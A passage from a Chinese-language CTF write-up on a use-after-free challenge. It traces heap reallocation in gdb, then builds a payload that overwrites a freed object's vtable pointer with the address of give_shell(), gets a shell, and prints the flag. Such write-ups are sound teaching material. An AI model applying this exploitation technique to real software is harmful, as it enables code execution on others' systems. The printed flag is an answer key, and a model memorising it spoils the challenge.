+</code></pre><p>我们来看一个很重要的点，就是刚才说的，释放掉的空间，如果立刻申请，且大小合适，就会分配刚释放掉的空间，在这个位置下断点，我们可以查看具体的情况</p>
+<pre><code>gdb-peda$ b *0x0000000000401000
+Breakpoint 3 at 0x401000
+gdb-peda$ info b
+Num     Type           Disp Enb Address            What
+3       breakpoint     keep y   0x0000000000401000 &lt;main+316&gt;
+</code></pre><p>跑起来，先释放掉，然后写数据</p>
+<pre><code>gdb-peda$ r
+Starting program: /home/wnagzihxain/uaf 
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+</code></pre><p>申请完空间</p>
+<pre><code class="lang-[----------------------------------registers-----------------------------------]">RAX: 0x614ca0 --&gt; 0x614c40 --&gt; 0x0 
+RBX: 0x614ca0 --&gt; 0x614c40 --&gt; 0x0 
+RCX: 0x7ffff7839b20 --&gt; 0x0 
+RDX: 0x614ca0 --&gt; 0x614c40 --&gt; 0x0 
+RSI: 0x7ffff7839b20 --&gt; 0x0 
+RDI: 0x0 
+RBP: 0x7fffffffe360 --&gt; 0x4013b0 (&lt;__libc_csu_init&gt;:    mov    QWORD PTR [rsp-0x28],rbp)
+RSP: 0x7fffffffe300 --&gt; 0x7fffffffe448 --&gt; 0x7fffffffe7bc (&quot;/home/wnagzihxain/uaf&quot;)
+RIP: 0x401025 (&lt;main+353&gt;:    mov    QWORD PTR [rbp-0x20],rax)
+R8 : 0x614c40 --&gt; 0x0 
+R9 : 0x1999999999999999 
+R10: 0x6cc 
+R11: 0x7ffff7ae2f10 (&lt;_Znam&gt;:    sub    rsp,0x8)
+R12: 0x7fffffffe320 --&gt; 0x614c88 --&gt; 0x6c6c694a (&#39;Jill&#39;)
+R13: 0x7fffffffe440 --&gt; 0x3 
+R14: 0x0 
+R15: 0x0
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x401019 &lt;main+341&gt;:    mov    rax,QWORD PTR [rbp-0x28]
+   0x40101d &lt;main+345&gt;:    mov    rdi,rax
+   0x401020 &lt;main+348&gt;:    call   0x400c70 &lt;_Znam@plt&gt;
+=&gt; 0x401025 &lt;main+353&gt;:    mov    QWORD PTR [rbp-0x20],rax
+   0x401029 &lt;main+357&gt;:    mov    rax,QWORD PTR [rbp-0x60]
+   0x40102d &lt;main+361&gt;:    add    rax,0x10
+   0x401031 &lt;main+365&gt;:    mov    rax,QWORD PTR [rax]
+   0x401034 &lt;main+368&gt;:    mov    esi,0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffe300 --&gt; 0x7fffffffe448 --&gt; 0x7fffffffe7bc (&quot;/home/wnagzihxain/uaf&quot;)
+0008| 0x7fffffffe308 --&gt; 0x30000ffff 
+0016| 0x7fffffffe310 --&gt; 0x614c38 --&gt; 0x6b63614a (&#39;Jack&#39;)
+0024| 0x7fffffffe318 --&gt; 0x401177 (&lt;_GLOBAL__sub_I_main+19&gt;:    pop    rbp)
+0032| 0x7fffffffe320 --&gt; 0x614c88 --&gt; 0x6c6c694a (&#39;Jill&#39;)
+0040| 0x7fffffffe328 --&gt; 0x614c50 --&gt; 0x0 
+0048| 0x7fffffffe330 --&gt; 0x614ca0 --&gt; 0x614c40 --&gt; 0x0 
+0056| 0x7fffffffe338 --&gt; 0x8 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x0000000000401025 in main ()
+</code></pre>
+<p>分配的空间为第二个类对象释放掉的空间，指针指向<code>0x614ca0</code>，因为第二个类对象的空间是后释放的，那么这里就会造成一个新问题，如果我们先释放掉两个对象，然后申请空间写数据进去，原第一个类对象的空间释放掉未使用，第二个类对象空间填充了新的数据，接着我们调用<code>case1</code>，会先调用第一个类对象的的函数，这个时候就会异常</p>
+<p>那么解决这个问题也很容易，我们申请两次即可，先写进原第二个类对象的空间，再写进原第一个类对象的空间，再调用即可</p>
+<p>至于构造的数据，直接就是<code>give_shell()</code>的指针即可</p>
+<pre><code>wnagzihxain@tot0c ~&gt; python -c &quot;print &#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;&quot; &gt; pwn
+</code></pre><p>测试一波</p>
+<pre><code>uaf@ubuntu:/tmp$ python -c &quot;print &#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;&quot; &gt; mypwn
+uaf@ubuntu:/tmp$ /home/uaf/uaf 24 mypwn
+1. use
+2. after
+3. free
+3
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+2
+your data is allocated
+1. use
+2. after
+3. free
+1
+$ whoami
+uaf
+$ cd ~ 
+$ ls
+flag  uaf  uaf.cpp
+$ cat flag
+yay_f1ag_aft3r_pwning
+</code></pre><p>Flag</p>
+<pre><code>yay_f1ag_aft3r_pwning
+</code></pre>
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
